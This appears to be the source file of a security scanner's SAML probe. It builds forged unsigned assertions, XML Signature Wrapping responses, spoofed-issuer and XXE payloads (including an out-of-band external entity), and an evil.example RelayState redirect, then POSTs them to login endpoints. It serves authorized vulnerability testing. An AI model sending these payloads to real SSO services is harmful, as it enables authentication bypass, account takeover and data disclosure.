// Dark Matter rule-based scanner — SAML 2.0 ACS probe.
// Tests Assertion Consumer Service endpoints for unsigned-response acceptance
// (authentication bypass), conditions enforcement (expired / wrong-audience),
// RelayState open redirect, and metadata exposure. Every CONFIRMED verdict
// sits behind a differential oracle per the 100% truth rule. The probe NEVER
// forges a real IdP session, never touches a live IdP, never follows
// redirects: ACS POSTs only, per-run canary NameIDs, tamper-and-observe.
// Advanced coverage (documented in docs/scanner/saml-advanced.md):
// - XSW (T2, #67/#441): genuine reference-binding test — we mint OUR OWN RSA
//   keypair, sign a decoy assertion's exact bytes (near-canonical form so the
//   digest matches what an inclusive-C14N validator hashes), and check whether
//   the SP validates that signature yet consumes a DIFFERENT unsigned
//   assertion. We never claim to forge the real IdP's key — the bug class is
//   reference-binding/trust-confusion, which this detects.
// - XXE (T3, #443): internal entity expansion probe; the OOB external-entity
//   variant needs a collaborator callback (opts.oobCallback) AND a lab-gated
//   host — otherwise it is skipped and the limit is documented.
// - Issuer confusion (#445): metadata integrity check + unsigned issuer-string
//   trust differential.

import zlib from 'node:zlib';
import crypto from 'node:crypto';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

// Known ACS / metadata paths
const ACS_PATHS = [
  '/saml/acs',
  '/sso/acs',
  '/saml2/acs',
  '/Shibboleth.sso/SAML2/POST',
  '/acs',
];
const METADATA_PATHS = [
  '/saml/metadata',
  '/metadata/saml',
  '/.well-known/saml-metadata',
];

// Bundle strings that hint at SAML usage (passive detection)
const SAML_BUNDLE_PATTERNS = [
  /SAMLResponse/i,
  /SAMLRequest/i,
  /\/saml\/acs/i,
  /\/sso\/acs/i,
  /Shibboleth\.sso/i,
  /RelayState/i,
  /urn:oasis:names:tc:SAML/i,
];

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

function evidenceBase(note, impact) {
  return {
    request: `POST <acs-endpoint> SAMLResponse=<deflate+base64 canary assertion> [& RelayState=<canary>] (redirects NOT followed)`,
    response: note,
    impact_demo: impact,
    signalCorrelated: true,
  };
}

export function matchSamlBundleHints(text) {
  const hits = [];
  for (const re of SAML_BUNDLE_PATTERNS) {
    if (re.test(text)) hits.push(re.source);
  }
  return hits;
}

// Build a minimal unsigned SAMLResponse (deflate + base64). All identities are
// per-run canaries — never a real user.
export function buildSamlResponse({ nameId, audience, notOnOrAfter, issuer }) {
  const id = `_${rand()}${Date.now().toString(36)}`;
  const now = new Date();
  const noa = notOnOrAfter || new Date(now.getTime() + 5 * 60 * 1000).toISOString();
  const xml =
    `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ` +
    `xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="${id}" Version="2.0" ` +
    `IssueInstant="${now.toISOString()}">` +
    `<saml:Issuer>${issuer || 'https://dm-probe.invalid/idp'}</saml:Issuer>` +
    `<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>` +
    `<saml:Assertion ID="${id}-a" Version="2.0" IssueInstant="${now.toISOString()}">` +
    `<saml:Issuer>${issuer || 'https://dm-probe.invalid/idp'}</saml:Issuer>` +
    `<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">${nameId}</saml:NameID>` +
    `<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"/></saml:Subject>` +
    `<saml:Conditions NotBefore="${new Date(now.getTime() - 5 * 60 * 1000).toISOString()}" NotOnOrAfter="${noa}">` +
    `<saml:AudienceRestriction><saml:Audience>${audience}</saml:Audience></saml:AudienceRestriction>` +
    `</saml:Conditions>` +
    `<saml:AuthnStatement AuthnInstant="${now.toISOString()}"/>` +
    `</saml:Assertion></samlp:Response>`;
  return zlib.deflateRawSync(Buffer.from(xml, 'utf8')).toString('base64');
}

function deflateB64(xml) {
  return zlib.deflateRawSync(Buffer.from(xml, 'utf8')).toString('base64');
}

// LAB GATE: aggressive variants run only when the authorized host is listed
// in opts.labTargets (same split pattern as index.js).
function isLabHost(url, opts) {
  let host = '';
  try { host = new URL(url).host; } catch { return false; }
  return String(opts.labTargets || '')
    .split(/[,\s]+/)
    .some((t) => t && (host.includes(t) || t.includes(host)));
}

// ---- XSW helpers (#67/#441) ----
// Honest design note: we cannot know the real IdP's signing key, so this test
// never claims to forge an IdP signature. We mint OUR OWN throwaway RSA
// keypair per run, sign assertion-1's exact bytes with it, and check whether
// the SP (a) cryptographically validates a signature at all while (b) granting
// a session for a DIFFERENT, unsigned assertion in the same Response. That
// reference-binding / trust-confusion gap IS the XSW bug class
// (duplicate-assertion and ID-confusion wrapping).

// Assertion in near-canonical form: attributes lexicographically sorted,
// empty elements self-closed, namespaces declared on the apex, zero
// whitespace text nodes — so our byte digest matches what an inclusive-C14N
// validator hashes over the same node.
function canonicalAssertionXml({ id, nameId, issuer, audience }) {
  const now = new Date().toISOString();
  const nb = new Date(Date.now() - 5 * 60 * 1000).toISOString();
  const noa = new Date(Date.now() + 5 * 60 * 1000).toISOString();
  return (
    `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ` +
    `xmlns:ds="http://www.w3.org/2000/09/xmldsig#" ` +
    `ID="${id}" IssueInstant="${now}" Version="2.0">` +
    `<saml:Issuer>${issuer}</saml:Issuer>` +
    `<saml:Subject>` +
    `<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">${nameId}</saml:NameID>` +
    `<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"/>` +
    `</saml:Subject>` +
    `<saml:Conditions NotBefore="${nb}" NotOnOrAfter="${noa}">` +
    `<saml:AudienceRestriction><saml:Audience>${audience}</saml:Audience></saml:AudienceRestriction>` +
    `</saml:Conditions>` +
    `<saml:AuthnStatement AuthnInstant="${now}"/>` +
    `</saml:Assertion>`
  );
}

// Build a wrapped Response: assertion-1 (dummy identity) carries an enveloped
// RSA-SHA256 signature whose Reference URI points at assertion-1's own ID;
// assertion-2 (OUR canary identity) is completely UNSIGNED. signedFirst=false
// (signed decoy LAST) catches last-assertion consumers; signedFirst=true
// catches first-assertion consumers. In both orders the signature's Reference
// URI points at a DIFFERENT assertion than the one carrying the canary — the
// ID-confusion variant. Returns {xml, publicKeyPem} for test verification.
export function buildXswResponse({ canary, issuer, audience, signedFirst = false }) {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const dummy = `dummy-user-${rand()}`;
  const a1id = `_${rand()}${Date.now().toString(36)}a1`;
  const a2id = `_${rand()}${Date.now().toString(36)}a2`;
  const a1body = canonicalAssertionXml({ id: a1id, nameId: dummy, issuer, audience });
  const digest = crypto.createHash('sha256').update(a1body, 'utf8').digest('base64');
  const signedInfo =
    `<ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">` +
    `<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>` +
    `<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>` +
    `<ds:Reference URI="#${a1id}">` +
    `<ds:Transforms>` +
    `<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>` +
    `<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>` +
    `</ds:Transforms>` +
    `<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>` +
    `<ds:DigestValue>${digest}</ds:DigestValue>` +
    `</ds:Reference></ds:SignedInfo>`;
  const sigVal = crypto.sign('sha256', Buffer.from(signedInfo, 'utf8'), privateKey).toString('base64');
  const signatureXml =
    `<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">${signedInfo}` +
    `<ds:SignatureValue>${sigVal}</ds:SignatureValue>` +
    `<ds:KeyInfo><ds:KeyName>dm-probe-key</ds:KeyName></ds:KeyInfo></ds:Signature>`;
  // Enveloped: the digest covers assertion-1 WITHOUT the signature, so the
  // signature is inserted after Issuer without disturbing the digest.
  const a1signed = a1body.replace(/(<saml:Issuer>[^<]*<\/saml:Issuer>)/, `$1${signatureXml}`);
  const a2 = canonicalAssertionXml({ id: a2id, nameId: canary, issuer, audience });
  const now = new Date().toISOString();
  const respId = `_${rand()}${Date.now().toString(36)}r`;
  const assertions = signedFirst ? a1signed + a2 : a2 + a1signed;
  const xml =
    `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ` +
    `xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ` +
    `ID="${respId}" IssueInstant="${now}" Version="2.0">` +
    `<saml:Issuer>${issuer}</saml:Issuer>` +
    `<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>` +
    assertions + `</samlp:Response>`;
  return {
    xml,
    publicKeyPem: publicKey.export({ type: 'spki', format: 'pem' }),
    signedAssertionId: a1id,
    canaryAssertionId: a2id,
  };
}

// ---- XXE helper (#443) ----
// Unsigned SAMLResponse carrying a DOCTYPE. Internal-entity variant defines
// <!ENTITY name "value"> and references it in NameID; the external variant
// points a parameter entity at a canary URL (OOB, lab-gated). Never targets
// real files — canary URLs only.
export function buildXxeSamlResponse({ nameId, audience, issuer, entityName, entityValue, externalUrl }) {
  const id = `_${rand()}${Date.now().toString(36)}`;
  const nowD = new Date();
  const now = nowD.toISOString();
  const noa = new Date(nowD.getTime() + 5 * 60 * 1000).toISOString();
  const doctype = externalUrl
    ? `<!DOCTYPE samlp:Response [<!ENTITY % dmxxe SYSTEM "${externalUrl}"> %dmxxe;]>`
    : `<!DOCTYPE samlp:Response [<!ENTITY ${entityName} "${entityValue}">]>`;
  const xml = doctype +
    `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ` +
    `xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="${id}" Version="2.0" ` +
    `IssueInstant="${now}">` +
    `<saml:Issuer>${issuer || 'https://dm-probe.invalid/idp'}</saml:Issuer>` +
    `<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>` +
    `<saml:Assertion ID="${id}-a" Version="2.0" IssueInstant="${now}">` +
    `<saml:Issuer>${issuer || 'https://dm-probe.invalid/idp'}</saml:Issuer>` +
    `<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">${nameId}</saml:NameID>` +
    `<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"/></saml:Subject>` +
    `<saml:Conditions NotBefore="${new Date(nowD.getTime() - 5 * 60 * 1000).toISOString()}" NotOnOrAfter="${noa}">` +
    `<saml:AudienceRestriction><saml:Audience>${audience}</saml:Audience></saml:AudienceRestriction>` +
    `</saml:Conditions>` +
    `<saml:AuthnStatement AuthnInstant="${now}"/>` +
    `</saml:Assertion></samlp:Response>`;
  return xml;
}

// POST a SAMLResponse to the ACS without following redirects.
// Returns {status, setCookie, location, body}.
export async function postSamlResponse(acsUrl, samlResponse, opts = {}) {
  const timeoutMs = opts.timeoutMs || 5000;
  const params = new URLSearchParams({ SAMLResponse: samlResponse });
  if (opts.relayState) params.set('RelayState', opts.relayState);
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const res = await fetch(acsUrl, {
      method: 'POST',
      headers: {
        'User-Agent': UA,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: params.toString(),
      redirect: 'manual', // NEVER follow — read headers and stop
      signal: ctrl.signal,
    });
    const body = await res.text().catch(() => '');
    return {
      status: res.status,
      setCookie: res.headers.get('set-cookie') || '',
      location: res.headers.get('location') || '',
      body: body.slice(0, 4000),
    };
  } catch {
    return { status: 0, setCookie: '', location: '', body: '' };
  } finally {
    clearTimeout(timer);
  }
}

// Did the ACS grant a session for our canary? Session = session-like
// Set-Cookie OR the canary NameID rendered in the body/location.
export function sessionGranted(r, canary) {
  const cookieHit = /(session|sess|auth|token|sid)/i.test(r.setCookie) && r.setCookie.length > 10;
  const canaryHit = (r.body + ' ' + r.location).includes(canary);
  return cookieHit || canaryHit;
}

// Window around the granted session's proof: the canary NameID rendered in
// the body/location, else the session-cookie name (value redacted).
function grantedWindow(r, canary) {
  const hay = `${r.body || ''} ${r.location || ''}`;
  const idx = hay.indexOf(canary);
  if (idx >= 0) return hay.slice(Math.max(0, idx - 60), idx + 120);
  const m = (r.setCookie || '').match(/^([^=;]+)=/);
  if (m) return `Set-Cookie: ${m[1]}=<session>`;
  return `status ${r.status}`;
}

// GET metadata discovery. Returns {acsUrl, entityId} or null.
export async function discoverSamlMetadata(baseUrl, opts = {}) {
  const timeoutMs = opts.timeoutMs || 5000;
  let base;
  try { base = new URL(baseUrl); } catch { return null; }
  const origin = `${base.protocol}//${base.host}`;
  for (const p of METADATA_PATHS) {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const res = await fetch(origin + p, {
        headers: { 'User-Agent': UA, Accept: 'application/xml,text/xml' },
        signal: ctrl.signal,
      });
      if (!res.ok) continue;
      const xml = await res.text();
      const m = xml.match(/AssertionConsumerService[^>]*Location="([^"]+)"/i);
      const e = xml.match(/entityID="([^"]+)"/i);
      const v = xml.match(/validUntil="([^"]+)"/i);
      if (m) return { acsUrl: m[1], entityId: e ? e[1] : null, metadataUrl: origin + p, validUntil: v ? v[1] : null };
    } catch { /* try next */ } finally {
      clearTimeout(timer);
    }
  }
  return null;
}

async function findAcsEndpoint(url, opts) {
  const timeoutMs = opts.timeoutMs || 5000;
  let base;
  try { base = new URL(url); } catch { return null; }
  const origin = `${base.protocol}//${base.host}`;
  const canary = `DarkMatterProbe-${rand()}`;
  for (const p of ACS_PATHS) {
    const acs = origin + p;
    const sr = buildSamlResponse({ nameId: canary, audience: origin });
    const r = await postSamlResponse(acs, sr, { timeoutMs });
    // A live ACS answers with redirect/session/error — not connection failure.
    // 404/405 silence = not an ACS.
    if (r.status !== 0 && r.status !== 404 && r.status !== 405) return acs;
  }
  return null;
}

export async function probeSaml(url, opts = {}) {
  const findings = [];
  const timeoutMs = opts.timeoutMs || 5000;
  const depth = opts.depth || 'standard';
  const canary = `DarkMatterProbe-${rand()}`;

  let baseU;
  try { baseU = new URL(url); } catch { return findings; }
  const origin = `${baseU.protocol}//${baseU.host}`;

  // ---- Discovery: SAML metadata (INFO) ----
  const meta = await discoverSamlMetadata(url, { timeoutMs });
  if (meta) {
    findings.push({
      class: 'saml_metadata_exposed',
      id: `saml-meta-${rand()}`,
      title: 'SAML SP metadata exposed — ACS endpoint enumerated',
      severity: 'info',
      url: meta.metadataUrl,
      parameter: 'AssertionConsumerService',
      evidence: evidenceBase(
        `metadata at ${meta.metadataUrl} → ACS=${meta.acsUrl}; entityID=${meta.entityId || 'n/a'}`,
        'Attackers enumerate the ACS for targeted assertion attacks'
      ),
    });
    // ---- #445a: metadata integrity — spoofable if served over HTTP or
    // unbounded (no validUntil). Unsigned metadata is the norm in the wild,
    // but http/unbounded metadata is trivially spoofable by a MITM.
    const servedHttp = (meta.metadataUrl || '').startsWith('http://');
    const noValidUntil = !meta.validUntil;
    if (servedHttp || noValidUntil) {
      findings.push({
        class: 'saml_metadata_unsigned',
        id: `saml-metasec-${rand()}`,
        title: 'SAML metadata served without integrity guarantees — spoofable',
        severity: 'low',
        url: meta.metadataUrl,
        parameter: 'EntityDescriptor',
        evidence: evidenceBase(
          `metadata ${servedHttp ? 'served over plain HTTP' : 'served over HTTPS'}` +
          `${noValidUntil ? '; no validUntil attribute (unbounded trust)' : `; validUntil=${meta.validUntil}`}`,
          'A MITM can substitute a spoofed IdP/SP descriptor — metadata should be https + validUntil-bounded'
        ),
      });
    }
  }

  // ---- Find a live ACS endpoint ----
  const acsUrl = meta?.acsUrl || await findAcsEndpoint(url, { timeoutMs });
  if (!acsUrl) return findings;
  const audience = meta?.entityId || origin;

  // ---- T1: unsigned SAMLResponse accepted — CRITICAL (differential) ----
  const srUnsigned = buildSamlResponse({ nameId: canary, audience });
  const rUnsigned = await postSamlResponse(acsUrl, srUnsigned, { timeoutMs });
  // Control: same payload but garbled audience — if BOTH "succeed", the
  // endpoint is not really processing assertions (static success page).
  const srGarbled = buildSamlResponse({ nameId: canary, audience: `https://garbled.invalid/${rand()}` });
  const rGarbled = await postSamlResponse(acsUrl, srGarbled, { timeoutMs });
  const unsignedOk = sessionGranted(rUnsigned, canary);
  const garbledOk = sessionGranted(rGarbled, canary);
  const unsignedAccepted = unsignedOk && !garbledOk;
  if (unsignedAccepted) {
    findings.push({
      class: 'saml_unsigned_accepted',
      id: `saml-unsigned-${rand()}`,
      title: 'ACS accepts unsigned SAMLResponse — authentication bypass',
      severity: 'critical',
      url: acsUrl,
      parameter: 'SAMLResponse',
      evidence: evidenceBase(
        `unsigned assertion (NameID=${canary}) → session granted (${rUnsigned.status}, cookie=${rUnsigned.setCookie.slice(0, 80)}); garbled-audience control → no session — "...${grantedWindow(rUnsigned, canary)}..."`,
        'Anyone can mint a SAMLResponse for any user — full account takeover, no credentials needed'
      ),
    });
  } else if (unsignedOk && garbledOk) {
    findings.push({
      class: 'saml_not_processing',
      id: `saml-static-${rand()}`,
      title: 'ACS endpoint does not appear to process SAMLResponse (static success)',
      severity: 'info',
      url: acsUrl,
      parameter: 'SAMLResponse',
      evidence: evidenceBase(
        `both valid-audience (${rUnsigned.status}) and garbled-audience (${rGarbled.status}) assertions returned identical session signals — endpoint is not validating`,
        'No bypass proven; endpoint behavior noted for manual review'
      ),
    });
  }

  if (depth === 'quick') {
    // Quick still gets the RelayState check (cheap, high signal).
  } else {
    // ---- T4: conditions enforcement (only meaningful if unsigned accepted) ----
    if (unsignedAccepted) {
      // Expired assertion: NotOnOrAfter 10 min in the past, POST twice.
      const expired = new Date(Date.now() - 10 * 60 * 1000).toISOString();
      const srExp1 = buildSamlResponse({ nameId: canary, audience, notOnOrAfter: expired });
      const srExp2 = buildSamlResponse({ nameId: canary, audience, notOnOrAfter: expired });
      const rE1 = await postSamlResponse(acsUrl, srExp1, { timeoutMs });
      const rE2 = await postSamlResponse(acsUrl, srExp2, { timeoutMs });
      if (sessionGranted(rE1, canary) && sessionGranted(rE2, canary)) {
        findings.push({
          class: 'saml_expired_accepted',
          id: `saml-expired-${rand()}`,
          title: 'ACS accepts expired SAML assertion — replay exposure',
          severity: 'medium',
          url: acsUrl,
          parameter: 'NotOnOrAfter',
          evidence: evidenceBase(
            `2x expired assertion (NotOnOrAfter=${expired}) → both granted session for ${canary} — "...${grantedWindow(rE1, canary)}..."`,
            'Stolen assertions never expire — replayable indefinitely'
          ),
        });
      }
      // Wrong audience.
      const srAud = buildSamlResponse({ nameId: canary, audience: 'https://evil.example/' });
      const rAud = await postSamlResponse(acsUrl, srAud, { timeoutMs });
      if (sessionGranted(rAud, canary)) {
        findings.push({
          class: 'saml_audience_ignored',
          id: `saml-aud-${rand()}`,
          title: 'ACS ignores SAML Audience restriction — cross-app assertion accepted',
          severity: 'medium',
          url: acsUrl,
          parameter: 'Audience',
          evidence: evidenceBase(
            `assertion for audience https://evil.example/ → session granted — "...${grantedWindow(rAud, canary)}..."`,
            'Assertions minted for other apps are accepted here'
          ),
        });
      }
    }

    // ---- XSW (#67/#441, CRITICAL differential): only meaningful when T1's
    // unsigned assertion was REJECTED — if unsigned is accepted, wrapping is
    // moot and is skipped (nothing to wrap around).
    if (!unsignedAccepted) {
      const xswCanary = `DarkMatterProbe-xsw-${rand()}`;
      // Control: fresh single unsigned assertion for the XSW canary — expect
      // reject (re-proves the T1 verdict on the same identity we will wrap).
      const srCtl = buildSamlResponse({ nameId: xswCanary, audience });
      const rCtl = await postSamlResponse(acsUrl, srCtl, { timeoutMs });
      if (!sessionGranted(rCtl, xswCanary)) {
        // Attack: 2 POSTs — signed decoy last (catches last-assertion
        // consumers) and signed decoy first (catches first-assertion
        // consumers). In both, the signature's Reference URI binds
        // assertion-1 (dummy) while the canary rides in the OTHER, unsigned
        // assertion — the ID-confusion variant.
        for (const signedFirst of [false, true]) {
          const wrapped = buildXswResponse({
            canary: xswCanary,
            issuer: 'https://dm-probe.invalid/idp',
            audience,
            signedFirst,
          });
          const r = await postSamlResponse(acsUrl, deflateB64(wrapped.xml), { timeoutMs });
          if (sessionGranted(r, xswCanary)) {
            findings.push({
              class: 'saml_xsw',
              id: `saml-xsw-${rand()}`,
              title: 'SAML XML Signature Wrapping — signed assertion validated, unsigned assertion consumed',
              severity: 'critical',
              url: acsUrl,
              parameter: 'SAMLResponse',
              evidence: evidenceBase(
                `control: single unsigned assertion for ${xswCanary} → rejected (${rCtl.status}); ` +
                `attack: Response with OUR-RSA-signed dummy assertion (Reference URI → its own ID) + unsigned ` +
                `canary assertion (signed-${signedFirst ? 'first' : 'last'} order) → session granted for the ` +
                `UNSIGNED CANARY ${xswCanary} (${r.status}, cookie=${r.setCookie.slice(0, 80)}) — "...${grantedWindow(r, xswCanary)}..."`,
                'Attacker wraps any captured signed assertion around an arbitrary unsigned identity — account takeover without the IdP key'
              ),
            });
            break;
          }
        }
      }
    }

    // ---- #445b: issuer-confusion differential — unsigned assertions are
    // rejected, but does the SP trust the Issuer STRING without a signature?
    // POST two unsigned assertions: one carrying the SP's own entityID from
    // metadata (spoofed "trusted" issuer), one with a random issuer.
    if (!unsignedAccepted && meta?.entityId) {
      const issCanary = `DarkMatterProbe-iss-${rand()}`;
      const srTrusted = buildSamlResponse({ nameId: issCanary, audience, issuer: meta.entityId });
      const srRandom = buildSamlResponse({ nameId: issCanary, audience, issuer: `https://evil.invalid/${rand()}` });
      const rT = await postSamlResponse(acsUrl, srTrusted, { timeoutMs });
      const rR = await postSamlResponse(acsUrl, srRandom, { timeoutMs });
      if (sessionGranted(rT, issCanary) && !sessionGranted(rR, issCanary)) {
        findings.push({
          class: 'saml_issuer_spoof',
          id: `saml-isspo-${rand()}`,
          title: 'SAML issuer string trusted without signature — issuer-confusion authentication bypass',
          severity: 'high',
          url: acsUrl,
          parameter: 'Issuer',
          evidence: evidenceBase(
            `unsigned assertion with Issuer=${meta.entityId} (spoofed trusted issuer) → session granted for ` +
            `${issCanary} (${rT.status}) — "...${grantedWindow(rT, issCanary)}..."; unsigned assertion with random issuer → rejected (${rR.status})`,
            'Anyone can mint unsigned assertions carrying the trusted issuer string — full account takeover'
          ),
        });
      }
    }

    // ---- XXE in SAML parsing (#443) ----
    // (a) Internal entity expansion: benign DOCTYPE, entity referenced in
    // NameID. If the response/error reflects the EXPANDED value, the parser
    // processes entities → XXE-capable parser.
    {
      const xxeVal = `DMXXE-${rand()}`;
      const xxeXml = buildXxeSamlResponse({
        nameId: '&dmxxe;', audience, entityName: 'dmxxe', entityValue: xxeVal,
      });
      const rX = await postSamlResponse(acsUrl, deflateB64(xxeXml), { timeoutMs });
      if ((rX.body || '').includes(xxeVal)) {
        const xIdx = rX.body.indexOf(xxeVal);
        const xWindow = rX.body.slice(Math.max(0, xIdx - 60), xIdx + 120);
        findings.push({
          class: 'saml_xxe_entities',
          id: `saml-xxe-${rand()}`,
          title: 'SAML parser resolves XML entities (XXE) — internal entity expansion observed',
          severity: 'info',
          url: acsUrl,
          parameter: 'SAMLResponse',
          evidence: evidenceBase(
            `unsigned assertion with <!ENTITY dmxxe "${xxeVal}"> referenced as &dmxxe; in NameID → response ` +
            `reflected the EXPANDED value — "...${xWindow}..."`,
            'Entity-processing parser on the auth endpoint: gateway to external-entity / file-disclosure XXE'
          ),
        });
      }
      // (b) OOB external-entity variant: only when an OOB callback base is
      // available (opts.oobCallback) AND the host is lab-gated. Never
      // exfiltrates real files — the entity target is a canary URL only.
      // xxe.js has no collaborator infra today, so in practice this stays
      // skipped and the limit is documented in docs/scanner/saml-advanced.md.
      if (opts.oobCallback && isLabHost(url, opts)) {
        const oobUrl = `${String(opts.oobCallback).replace(/\/+$/, '')}/saml-xxe-${rand()}`;
        const xxeOobXml = buildXxeSamlResponse({ nameId: 'oob-probe', audience, externalUrl: oobUrl });
        const rOob = await postSamlResponse(acsUrl, deflateB64(xxeOobXml), { timeoutMs });
        findings.push({
          class: 'saml_xxe_oob_sent',
          id: `saml-xxeoob-${rand()}`,
          title: 'SAML XXE OOB probe dispatched (external parameter entity) — confirm via collaborator',
          severity: 'info',
          url: acsUrl,
          parameter: 'SAMLResponse',
          evidence: evidenceBase(
            `external parameter entity → ${oobUrl} sent (status ${rOob.status}; canary URL only, no file targets); ` +
            `confirm out-of-band via the collaborator`,
            'An OOB hit proves external-entity resolution (blind XXE) on the ACS'
          ),
        });
      }
    }
  }

  // ---- T5: RelayState open redirect ----
  const evilRelay = `https://evil.example/${rand()}`;
  const srRelay = buildSamlResponse({ nameId: canary, audience });
  const rRelay = await postSamlResponse(acsUrl, srRelay, { relayState: evilRelay, timeoutMs });
  const loc = rRelay.location || '';
  if (rRelay.status >= 300 && rRelay.status < 400 && loc.includes('evil.example') && !loc.includes(baseU.host)) {
    const carriesSession = /[?&#](token|session|code|id_token)=/i.test(loc);
    findings.push({
      class: 'saml_relaystate_redirect',
      id: `saml-relay-${rand()}`,
      title: carriesSession
        ? 'ACS reflects RelayState into redirect with session material — open redirect + token leak'
        : 'ACS reflects RelayState into redirect unvalidated — open redirect',
      severity: carriesSession ? 'medium' : 'low',
      url: acsUrl,
      parameter: 'RelayState',
      evidence: evidenceBase(
        `RelayState=${evilRelay} → ${rRelay.status} Location=${loc.slice(0, 200)}`,
        'Phishing-grade open redirect on the SSO callback'
      ),
    });
  }

  return findings;
}
